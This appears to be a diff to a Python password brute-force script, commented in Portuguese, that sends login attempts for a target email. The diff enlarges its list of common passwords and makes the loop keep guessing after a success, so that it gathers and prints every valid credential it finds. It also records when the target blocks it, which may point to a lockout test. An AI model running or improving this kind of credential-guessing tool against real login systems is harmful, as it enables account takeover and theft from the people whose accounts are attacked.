@@ -31,6 +31,40 @@ COMMON_PASSWORDS = [
     "monkey",
     "1234567890",
     "football",
+    "dragon",
+    "master",
+    "shadow",
+    "superman",
+    "michael",
+    "jennifer",
+    "trustno1",
+    "batman",
+    "starwars",
+    "1q2w3e4r",
+    "killer",
+    "sunshine",
+    "iloveyou",
+    "princess",
+    "solo",
+    "charlie",
+    "freedom",
+    "whatever",
+    "qazwsx",
+    "ninja",
+    "mustang",
+    "access",
+    "hello",
+    "696969",
+    "!@#$%^&*",
+    "jordan23",
+    "passw0rd",
+    "Password1",
+    "P@ssw0rd",
+    "qwerty123",
+    "zxcvbnm",
+    "asdfgh",
+    "123qwe",
+    "1qaz2wsx",
 ]
 
 COMMON_EMAILS = [
@@ -64,7 +98,7 @@ def brute_force_attack(
         "total_attempts": 0,
         "successful": False,
         "blocked_at": None,
-        "valid_credentials": None,
+        "valid_credentials": [],
         "responses": [],
     }
 
@@ -88,17 +122,16 @@ def brute_force_attack(
                 "response": response.json() if response.headers.get('content-type') == 'application/json' else response.text[:100],
             })
 
+            # Marca sucesso mas continua testando
+            status_icon = "✓" if response.status_code == 200 else " "
+            
             if verbose:
-                print(f"[{idx}/{len(passwords)}] Testing: {password:<20} | Status: {response.status_code}")
+                print(f"[{status_icon}] [{idx}/{len(passwords)}] Testing: {password:<20} | Status: {response.status_code}")
 
-            # Sucesso no login
+            # Sucesso no login - armazena mas continua
             if response.status_code == 200:
                 results["successful"] = True
-                results["valid_credentials"] = {"email": target_email, "password": password}
-                print(f"\n✅ SUCESSO! Credenciais válidas encontradas:")
-                print(f"   Email: {target_email}")
-                print(f"   Password: {password}")
-                break
+                results["valid_credentials"].append({"email": target_email, "password": password})
 
             # Sistema bloqueou
             if response.status_code == 403 or "blocked" in response.text.lower():
@@ -182,6 +215,13 @@ if __name__ == "__main__":
         print(f"{'='*60}")
         print(f"Total de tentativas: {results['total_attempts']}")
         print(f"Sucesso: {'✅ SIM' if results['successful'] else '❌ NÃO'}")
+        
+        if results['valid_credentials']:
+            print(f"\n✅ CREDENCIAIS VÁLIDAS ENCONTRADAS:")
+            for cred in results['valid_credentials']:
+                print(f"   📧 Email: {cred['email']}")
+                print(f"   🔑 Password: {cred['password']}")
+        
         if results['blocked_at']:
-            print(f"Bloqueado na tentativa: {results['blocked_at']}")
+            print(f"\nBloqueado na tentativa: {results['blocked_at']}")
         print(f"{'='*60}\n")
